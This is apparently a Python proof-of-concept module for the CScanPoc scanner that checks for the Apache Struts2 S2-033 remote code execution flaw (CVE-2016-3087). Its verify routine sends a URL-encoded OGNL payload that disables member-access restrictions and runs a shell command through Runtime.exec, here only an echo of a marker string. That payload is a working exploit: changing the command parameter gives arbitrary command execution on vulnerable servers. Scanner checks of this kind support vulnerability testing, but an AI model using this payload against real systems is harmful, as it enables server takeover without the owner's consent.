# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0013_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-033远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2016-05-12'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，Apache当使用REST插件时，当启用动态方法调用时，可以传递恶意的表达式，该恶意表达式可用于在服务器端执行任意代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-03754'  # 漏洞来源
    cnvd_id = 'CNVD-2016-03754'  # cnvd漏洞编号
    cve_id = 'CVE-2016-3087'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    # 漏洞应用版本
    product_version = 'Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)'


class Poc(ABPoc):
    poc_id = 'da6b978c-0372-45c1-a1f9-45fab3896b10'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payloadurl = """%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command%5B0%5D%29.getInputStream%28%29%29,%23wr%3d%23context%5B%23parameters.obj%5B0%5D%5D.getWriter%28%29,%23wr.print%28%23rs%29,%23wr.close%28%29,%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=echo 92933839f1efb2da9a4799753ee8d79c"""
            request = requests.get(
                '{target}/{payload}'.format(target=self.target, payload=payloadurl))
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
